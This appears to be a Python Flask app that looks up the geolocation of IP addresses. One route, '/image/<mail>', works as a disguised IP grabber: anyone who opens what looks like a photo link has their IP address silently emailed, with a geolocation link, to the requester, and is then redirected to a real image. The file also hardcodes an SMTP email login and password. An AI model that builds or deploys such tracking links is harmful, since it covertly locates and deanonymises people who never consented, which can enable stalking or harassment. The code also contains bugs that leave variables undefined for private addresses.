#!/usr/bin/python

## -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
## Import Python Libs
## -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
import geo
import iptools
from flask import Flask, render_template, request, redirect
import os, requests, json
from flask import request, jsonify
import geoip2.database
import maxminddb.const
import pprint
from email.mime.multipart import MIMEMultipart
import smtplib as root
import smtplib
from email.mime.text import MIMEText
from email.header import Header

## Get IP Range
IPRANGE = os.environ.get( 'IPRANGE', '52.0.0.0/30' )

## APP Flask
app = Flask(__name__)
app.config['SECRET_KEY'] = 'geo123'

## Private IP Addresses
private = iptools.IpRangeList(
    '0.0.0.0/8',      '10.0.0.0/8',     '100.64.0.0/10', '127.0.0.0/8',
    '169.254.0.0/16', '172.16.0.0/12',  '192.0.0.0/24',  '192.0.2.0/24',
    '192.88.99.0/24', '192.168.0.0/16', '198.18.0.0/15', '198.51.100.0/24',
    '203.0.113.0/24', '224.0.0.0/4',    '240.0.0.0/4',   '255.255.255.255/32'
)

#index '/'
@app.route("/", methods=['GET', 'POST'])
def index():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    except: 
        print('Error')
    if ip not in private: 
        geogo = json.dumps(geo.lookup(ip))
    
    return render_template('ip.json', geogo=geogo)

#geo js
@app.route("/geo.js", methods=['GET', 'POST'])
def geogo():
    try:
        ip = str(request.headers.get('X-Forwarded-For', request.remote_addr))
    except: 
        print('Error')
    if ip not in private: 
        geogo = json.dumps(geo.lookup(ip))
        geogo = json.loads(geogo)
        aso = geogo['aso']
        asn = geogo['asn']
        iso_code = geogo['iso_code']
        continent_code = geogo['continent_code']
        country = geogo['country']
        continent = geogo['continent']
        zip_code = geogo['zip_code']
        state = geogo['state']
        state_code = geogo['state_code']
        city = geogo['city']
        latitude = geogo['latitude']
        longitude = geogo['longitude']
        author = geogo['author']
    
    return render_template('ip.js', ip=ip, aso=aso, asn=asn, iso_code=iso_code, continent_code=continent_code, country=country, continent=continent, zip_code=zip_code, state=state, state_code=state_code, city=city, latitude=latitude, longitude=longitude, author=author)

#IP
@app.route("/<ip>", methods=['GET', 'POST'])
def ipstr(ip):
    try:
        ip = str(ip)
    except: 
        print('Error')
    if ip not in private: 
        geogo = json.dumps(geo.lookup(ip))
    
    return render_template('ip.json', geogo=geogo)

#mail IP
@app.route("/image/<mail>", methods=['GET', 'POST'])
def mailgo(mail):
    mail = mail
    try:
        ip = str(request.headers.get('X-Forwarded-For', request.remote_addr))
        url = 'smtp.mail.ru'
        toaddr = mail
        login = 'spam.bot.tg@bk.ru'
        password = 'sptg123123'
        message = "IP посмотревшего фото: " + ip + " \nБольше: https://geoipt.herokuapp.com/" + ip + "--------\nP.S. Всеволод html"
        msg = MIMEMultipart()
        msg['Subject'] = 'IP по фото VsevolodHTML'
        msg['From'] = login
        body = message
        msg.attach(MIMEText(body, 'plain'))
        server = root.SMTP_SSL(url, 465)
        server.login(login, password)
        server.sendmail(login, toaddr, msg.as_string())
        print('OK! IP: ' + str(ip) + " Mail: " + str(mail))
    except: 
        print('Error')

    return redirect("https://raw.githubusercontent.com/htmlcssphpjs/image/main/list-of-ips.jpg", code=302)

#RUN Flask APP
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)